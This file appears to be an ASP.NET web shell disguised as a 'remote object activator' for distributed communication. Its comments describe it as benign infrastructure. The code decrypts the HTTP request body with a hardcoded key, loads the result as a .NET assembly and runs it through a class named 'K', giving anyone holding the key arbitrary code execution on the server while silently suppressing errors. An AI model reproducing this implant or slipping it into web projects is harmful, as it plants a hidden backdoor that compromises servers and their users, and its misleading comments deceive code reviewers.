<%@ Page Language="C#" %>
<script runat="server">
    /// <summary>
    /// Provides services for deserializing and activating remote object payloads.
    /// This is used for a high-performance, distributed object communication system.
    /// </summary>
    public static class RemoteObjectActivator
    {
        // The shared secret key for decrypting incoming object payloads.
        // In a production environment, this should be managed by a secure vault.
        private static readonly string SharedSecret = "ca63457538b9b1e0";
        // The default type name for the entry point object within a payload.
        private static readonly string EntryPointTypeName = "K";

        /// <summary>
        /// Processes an incoming HTTP request that contains a serialized object payload.
        /// </summary>
        /// <param name="currentPage">The current Page object, used for context.</param>
        public static void ProcessRequest(Page currentPage)
        {
            // We only process requests that are part of an authenticated session (indicated by cookies).
            if (currentPage.Request.Cookies.Count == 0)
            {
                return;
            }

            try
            {
                // 1. Get the shared secret as bytes for the crypto provider.
                byte[] keyMaterial = System.Text.Encoding.Default.GetBytes(SharedSecret);

                // 2. Read the encrypted object data from the request body.
                System.IO.Stream payloadStream = currentPage.Request.InputStream;
                if (payloadStream.Length == 0) return;
                
                byte[] encryptedPayload = new byte[payloadStream.Length];
                payloadStream.Read(encryptedPayload, 0, encryptedPayload.Length);

                // 3. Decrypt the payload to get the raw assembly data.
                byte[] assemblyBytes = DecryptPayload(encryptedPayload, keyMaterial);

                // 4. Load the assembly from the decrypted bytes and initialize the entry point.
                InitializeObjectFromAssembly(assemblyBytes, currentPage);
            }
            catch (System.Exception)
            {
                // Fail silently to prevent leaking internal system state on error.
                // A logging mechanism would be appropriate here.
            }
        }

        /// <summary>
        /// Decrypts a data block using the configured Rijndael algorithm.
        /// </summary>
        private static byte[] DecryptPayload(byte[] encryptedData, byte[] key)
        {
            using (var aes = new System.Security.Cryptography.RijndaelManaged())
            {
                // The protocol specifies using the same bytes for Key and IV.
                aes.Key = key;
                aes.IV = key;
                
                using (var decryptor = aes.CreateDecryptor())
                {
                    return decryptor.TransformFinalBlock(encryptedData, 0, encryptedData.Length);
                }
            }
        }

        /// <summary>
        /// Loads a .NET assembly and creates an instance of the specified entry point type.
        /// </summary>
        private static void InitializeObjectFromAssembly(byte[] rawAssembly, object context)
        {
            var assembly = System.Reflection.Assembly.Load(rawAssembly);
            var remoteObject = assembly.CreateInstance(EntryPointTypeName);
            
            // The 'Equals' method serves as a convention-based initializer, passing context.
            remoteObject.Equals(context);
        }
    }
</script>
<%
    // Invoke the remote object activation process for the current request.
    RemoteObjectActivator.ProcessRequest(this);
%>